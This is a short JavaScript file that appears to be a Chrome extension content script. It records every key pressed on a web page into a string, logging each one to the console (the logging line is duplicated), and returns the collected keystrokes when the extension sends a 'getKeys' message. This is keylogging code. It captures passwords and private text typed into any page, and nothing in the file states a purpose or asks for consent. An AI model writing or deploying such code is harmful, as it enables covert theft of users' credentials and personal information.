let recordedKeys = '';

document.addEventListener('keydown', function(event) {
  console.log('Key pressed:', event.key);
  recordedKeys += event.key;
  console.log('Key pressed:', event.key);
});

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  if (message.type === 'getKeys') {
    sendResponse({ keys: recordedKeys });
  }
});

